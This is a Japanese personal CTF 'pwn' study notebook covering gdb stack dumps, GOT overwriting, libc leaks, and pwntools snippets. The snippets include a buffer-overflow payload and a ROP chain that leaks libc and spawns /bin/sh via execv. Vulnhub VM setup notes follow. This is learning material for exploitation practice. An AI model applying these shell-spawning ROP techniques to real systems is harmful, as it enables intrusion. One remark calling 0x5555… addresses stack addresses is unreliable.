0048| 0x7fffffffde90 --> 0x400970 (<__libc_csu_init>:	push   r15)  <- rbpが指しているsaved_rbp
0056| 0x7fffffffde98 --> 0x7ffff7a05b97 (<__libc_start_main+231>:	mov    edi,eax) <- リターンアドレス
0064| 0x7fffffffdea0 --> 0x1 
0072| 0x7fffffffdea8 --> 0x7fffffffdf78 --> 0x7fffffffe2b5 ("/home/takabaya-shi/environment/CTF-writeup/malleus-pwn/rot13/rot13")
0080| 0x7fffffffdeb0 --> 0x100008000 
0088| 0x7fffffffdeb8 --> 0x4007a2 (<main>:	push   rbp)
0096| 0x7fffffffdec0 --> 0x0 
0104| 0x7fffffffdec8 --> 0xd1145d117ed72115 
0112| 0x7fffffffded0 --> 0x400650 (<_start>:	xor    ebp,ebp)
0120| 0x7fffffffded8 --> 0x7fffffffdf70 --> 0x1 
0128| 0x7fffffffdee0 --> 0x0 
0136| 0x7fffffffdee8 --> 0x0 
0144| 0x7fffffffdef0 --> 0x2eeba26ed1772115 
0152| 0x7fffffffdef8 --> 0x2eebb2d1daa92115 
```
#### strcmp
```txt
   0x55555555529e <main+293>:	lea    rax,[rbp-0x90]
   0x5555555552a5 <main+300>:	lea    rsi,[rip+0xd81]        # 0x55555555602d
   0x5555555552ac <main+307>:	mov    rdi,rax
=> 0x5555555552af <main+310>:	call   0x555555555070 <strcmp@plt>
   0x5555555552b4 <main+315>:	test   eax,eax
   0x5555555552b6 <main+317>:	jne    0x5555555552dd <main+356>
```
`RSI`レジスタと`RDI`レジスタに比較したい文字列を代入して、一致しているかを見る。一致していなければ、JNEで不一致の処理に入る。
#### 変数

```txt
│           ; var char *s1 @ rbp-0x30

│           0x00400997      488d45d0       lea rax, [s1]         <- rsp-0x30のアドレスをraxに代入。getsの内容がここに書き込まれる
│           0x0040099b      4889c7         mov rdi, rax                ; char *s
│           0x0040099e      e88dfdffff     call sym.imp.gets           ; char *gets(char *s)

│      ││   0x004009ee      c745fc010000.  mov dword [var_4h], 1 <- rbp-0x4にある変数に1を代入
```


#### 覚えておきたい
##### 方針
すぐに落ちるようなプログラムは`exit`などの最後の方にある関数のGOTを`main`や`_start`に書き換えてループさせる必要がある。   

そのあとに、putsやprintfを呼び出してlibc leakさせる(systemを呼び出したいがアドレスがわからない)。   
その際、   
- setbufなどの別の関数のGOTをprintf@pltに書き換えてsetbufをcallしてprintfを呼び出す   
printf(leakしたいアドレス)としたいので、書き換えるGOTは引数を伴うものがよい。  
printf@pltのアドレスは固定。   
- printf@plt(ランダム化されない)をリターンアドレスにセット(x86)   
すでに一度呼ばれた関数のGOTにはlibcのアドレスが書かれているので、引数にはGOT_addrをセットしてlibc leak   
- `pop rdi;ret`をリターンアドレスにセットしてROP gadget (x86-64)   
- すでに一度呼ばれた関数のGOTの下位バイトを書き換えて別のlibcの関数を呼びだす   

##### 起動時の動作
```txt
_start -> __libc_start_main -> main という流れ
mainでなくても_startでもループできる

gdb-peda$ bt
#0  0x00000000004007fe in main ()
#1  0x00007ffff7a05b97 in __libc_start_main (main=0x4007fa <main>, argc=0x1, 
    argv=0x7fffffffdf88, init=<optimized out>, fini=<optimized out>, rtld_fini=<optimized out>, 
    stack_end=0x7fffffffdf78) at ../csu/libc-start.c:310
#2  0x000000000040070a in _start ()
```
##### 呼び出し規約
- x86の場合   
関数の引数はスタックに積まれる   
- x64の場合   
`rdi rsi	rdx	rcx	r8 r9`の順に引数としてレジスタが使われ、7個目以降はスタックが使われる。   
戻り値は`rax`が使用される。   

##### アドレス関係
```txt
libc_base        = addr_libc_mainarena - offset_libc_mainarena
libc_base        = libc_start_main - offset_libc_start_main
addr_libc_system    = libc_base + offset_libc_system
addr_libc_str_sh (/bin/sh)   = libc_base + offset_libc_str_sh
addr_libc_free_hook    = libc_base + offset_libc_free_hook
libc_gadget = libc_base + 0x4f2c5

(low)
|               |
|               |
|         0x251 | <- heap_base (不変)  0x555555757000
|               |
|0x555555757460 | <- tcache[0x120]の実体は0x250のchunkのどこかに存在
|               |
|               |
|         0x120 | <- 最後のチャンク 0x555555757460
|  AAAAA  AAAAA |
|   ~       ~   |
|  AAAAA  AAAAA |
|  AAAAA  20a00 | <- heap_top 0x555555757580
|               |    可変で下にどんどん伸びていく
|               |
|               |
|               |
|               | <- libc_base   0x7ffff79e4000 
|               |
|               | <- libc_start_main 0x7ffff7a05ab0
|               |
|               | <- libc_system 0x7ffff7a33440
|               |
|               | <- "/bin/sh"のポインタ 0x7ffff7b97e9a
|               |
|               | <- main_arena  0x7ffff7dcfc40
|               |
|               | <- fastbinsの実体 (0x80bytes以下)
|               |
|               | <- bins(unsortedbins)の実体
|               |
|               |
|               |
|               | <- stack 0x7fffffffdea0
|               |
(high)
```
`0x7fffff...`はスタックのアドレス。`0x555555...`はスタックのアドレス、であることが多い(?)。
##### リトルエンディアン
`ABCDEF`という入力をした場合、   
```txt
gdb-peda$ x /4wx $rbp-0x90
0x7fffffffdd90:	0x44434241	0x00004645	0xf7ffe710	0x00007fff

gdb-peda$ x /2gx $rbp-0x90
0x7fffffffdd90:	0x0000716034647461	0x00007ffff7ffe710

-> +0 | 44 43 42 41 |  
-> +4 | 00 00 46 45 | 

gdb-peda$ x /s $rbp-0x90
0x7fffffffdd90:	"ABCDEF"

RDI: 0x7fffffffdd90 --> 0x464544434241 ('ABCDEF')
```
メモリ上に格納される時、順序がこうなる。なお、文字列として読みだすときは順序が入力したときと同じに評価される。 

一方、アドレスは以下のように評価される。したがって、BOFでRIPを書き換えたりするときは、`10e7...ff7f`というように逆順に入力する必要がある。
```txt
gdb-peda$ x /gx $rbp-0x88
0x7fffffffdd98:	0x00007ffff7ffe710
```
##### pwntools
###### 文字列操作
- 0x7fff1234 -> b '\x34\x12\xff\x7f'   
```python
#python3のみ
# 文字列と結合しようとすると、
# TypeError: must be str, not bytes
val.to_bytes(int(byte),'little')
```   
```python
# python2 のみ
from pwn import *
r = remote("localhost", 4444)
p32(0x7fff1234) # '4\x12\xff\x7f'
p64(0x7fff1234) # '4\x12\xff\x7f\x00\x00\x00\x00'
payload  = "A" * 0x28 + p64(0x7fff1234)
r.send(payload)
```
- \x34\x12\xff\x7f -> 0x7fff1234   
```python
# python2 のみ
from pwn import *
hex(unpack('\xef\xbe\xad\xde')) # 0xdeadbeef
hex(u32('\xef\xbe\xad\xde'))  # 0xdeadbeef
hex(u64('\xef\xbe\xad\xde\x41\x42\x43\x45'))  # 0x45434241deadbeef
  
# python2,3 両方
import struct
print(hex(struct.unpack('<I',b'\x34\x12\xff\x7f')[0]))
```
- 0x7fffffff12345678(str) -> 0x7fffffff12345678(hex)
```python
lib_main_start_str = "0x7fffffff12345678"
hex(int(str(lib_main_start_str), 16))      # 0x7fffffff12345678
```
###### 通信関係
```txt
from pwn import *
conn = remote("localhost", 5000)

conn.sendafter("index: ", "-2")
conn.sendlineafter("ID: ", "admin")
libc_start_main = conn.recvline() #改行まで読み込み
conn.recvuntil('\n')

printf = conn.recv(6)      # 6を指定しないと余計なものまで読み込んでしまう
print("recv:" + printf)                  # recv:\x80\x8e\xa4�� (\x80\x8e\xa4\xf7\xff\x7f)
libc_printf = u64(printf.ljust(8,b'\0')) # libc_printf:0x7ffff7a48e80
                                         # u64(\x80\x8e\xa4\xf7\xff\x7f\x00\x00)

conn.interactive()
```
###### ELF解析
```txt
from pwn import *
context(os = "linux", arch = "amd64")
elf = ELF("./chall")
libc = ELF("./libc-2.27.so")

str(elf.got["malloc"]) #6295608
p64(elf.plt["printf"]) #\x90\x05@\x00\x00\x00\x00\x00
hex(elf.plt["printf"]) #0x400590
libc.symbols["__libc_start_main"] #137904
offset_libc_printf = libc.symbols["printf"] #137904

info('addr_libc_base    = 0x{:08x}'.format(libc_base))
```
###### Rop Chain
```txt
# puts(GOT_printf)でlibc leak

elf = ELF("./file")
rop = ROP(elf)
rop.puts(elf.got.printf)
rop.main()
print(rop.dump())
# 0x0000:         0x400873 pop rdi; ret             # return_addr
# 0x0008:         0x601020 [arg0] rdi = got.printf  # すでに一度呼ばれたprintf関数のGOT_addr
# 0x0010:         0x4005d0 puts                     # puts@plt
# 0x0018:         0x400782 main()                   # main関数の最初
conn.sendlineafter("ID: ", "A"*40 + rop.chain() )

# system("/bin/sh")呼び出し

libc.address = libc_printf - libc.symbols.printf

rop = ROP(libc)
# rop.system(next(libc.search(b'/bin/sh'))) # スタックアラインメントの問題がある場合がある
# rop.raw(0x400874)                         # retでrspを8バイトずらす
rop.execv(next(libc.search(b'/bin/sh')),0 ) # systemがダメな時はexecv()を使う
print(rop.dump())
# 0x0000:   0x7ffff7a07e6a pop rsi; ret
# 0x0008:              0x0 [arg1] rsi = 0
# 0x0010:   0x7ffff7a0555f pop rdi; ret
# 0x0018:   0x7ffff7b97e9a [arg0] rdi = 140737349516954
# 0x0020:   0x7ffff7ac8fa0 execv
conn.sendlineafter("ID: ", "A"*40 + rop.chain() )
```
##### alarmのbypass
`hexedit`でバイナリを書き換える。   
`[Ctrl]+x`で保存   
`[Ctrl]+c`で保存しない   
`/`で検索。`e8 9f fe ff ff`で検索する。`[Tab]`で切り替え   
```txt
  400867:	bf 3c 00 00 00       	mov    edi,0x3c           <- bf ff ff 00 00 に書き換えてもよい
  40086c:	e8 9f fe ff ff       	call   400710 <alarm@plt> <- 90 90 90 90 90 に書き換えてalarmを無視
```
##### Cの関数
```txt
---------------------------------------------------------------------
setbuf

#include <stdio.h>
void setbuf(FILE *, char *buffer);

buffer 引数が NULL の場合、stream はバッファーに入れられません。
そうでない場合、buffer は、長さが BUFSIZ の文字配列を指している必要があります

int init(){
    setbuf(stdout, NULL);
    setbuf(stderr, NULL);

    return 0;
}
バッファを経由するかどうか？NULLの場合はバッファを経由しない？

---------------------------------------------------------------------
gets

        char    buff[100];
        gets(buff);
        
文字列が何文字読み込まれるか分からないので、BOFの脆弱性がある。
gets関数は改行かEOFまでの文字列をNUL文字も含めて読み込む

----------------------------------------------------------------------
strcpy

#include <string.h>
char *strcpy(char *s1, const char *s2);

文字型配列 *s1 に文字列 *s2 を '\0' までコピー。
'\0' もコピーする。BOFを起こしやすい危険な関数

```
## 参考文献
### Heap
http://kyuri.hatenablog.jp/entry/2017/04/21/152626   
マジで神！free,malloc,unlink時の動作がコードでかいてある。   
  
https://www.valinux.co.jp/technologylibrary/document/linux/malloc0001/   
Heapの動作が日本語でわかりやすく書いてある。   
  
https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/implementation/tcache/   
tcacheのWiki    
  
https://raintrees.net/projects/a-painter-and-a-black-cat/wiki/CTF_Pwn    
Pwnの全体像がわかる。   
  
  
## todo
free, mallocの概念的理解（細かい挙動の理解と全体的な理解）   
gdb-peadで一度tcacheとかの挙動をちゃんと確認する。   
heap問の頻出パターンを押さえる(それまではあんまり自分で解いても意味なさそう)   
libc_baseとかlibc.main_arenaとかの計算方法が全然わかってない   
libc_baseよりmain_arenaの方が高いアドレスにある？   

## vulnhubメモ
### 古いバージョンのLinuxのインストール
https://soft.lafibre.info/   
http://old-releases.ubuntu.com/releases/14.04.0/   
からスカスカのubuntuをInstall。デスクトップは重い    
.isoを使用して、VMを作成する。

### virtualbox の設定
[export]すると、スナップショットも反映される。
exportした.ovaを7zで圧縮(95%だからほぼされないけど)すると230MBくらいだった。   
[新規]で[新しいハードディスクを作成]で、2.5GBくらい与える(1GだとInstall時にエラー)。   
それで、[設定]で[光学ドライブ]の新規から、.isoファイルを選択して、[起動]して指示に従う。   
10.04だけうまく行った。   
  
  ### install openssh
  `apt-get install openssh-server`だと、エラーで完了しない。   
  `apt-get update`しても、`faild to fetch`のerrorが大量に発生する。   
  rootになって、`apt-get update`する必要があるが、古いバージョンはパッケージの場所が変わっているため、`/etc/apt/sources.list`を書き換える必要がある。   
  `archive.ubuntu.com` -> `old-releases.ubuntu.com`   
  `us.archive.ubuntu.com` -> `old-releases.ubuntu.com`   
  `security.ubuntu.com` -> `old-releases.ubuntu.com`   
  https://qiita.com/ytyng/items/76784390a538bbb5117e   
  そのあと、`apt-get install openssh-server`でsshがinstallされて、sshdが起動した状態になった。
  
  ### install apache2
  `apt-get install apache2`   
  `apt-get install php5`   
  `usermod -s /usr/sbin/nologin www-data`   
  でwww-dataがログインできないようにする。   
  これで、80portにapacheが、index.htmlだけを持っている状態でInstallされた。   
  https://netlog.jpn.org/r271-635/2009/06/apache_ssl_on_ubuntu_81.html   
  
  ### install dovecot
  `apt-get install dovecot-imapd dovecot-pop3d`   
  でInstallすると、110,143,993,995で立ち上がる。   
  `/etc/dovecot/dovecot.conf`を以下のように編集すると、`user test`,`pass test`でログインできた。   
  ```txt
  disable_plaintext_auth = no (コメントアウトを外す)
  
  mail_location = maildir:~/Maildir (コメントアウトを外す)
  
  # mail_access_groups = (コメントアウトのまま)
  ```
  /home/test/Maildirが作成された。   
  `/home/test/Maildir/new`以下のファイルをログイン後に参照できる。
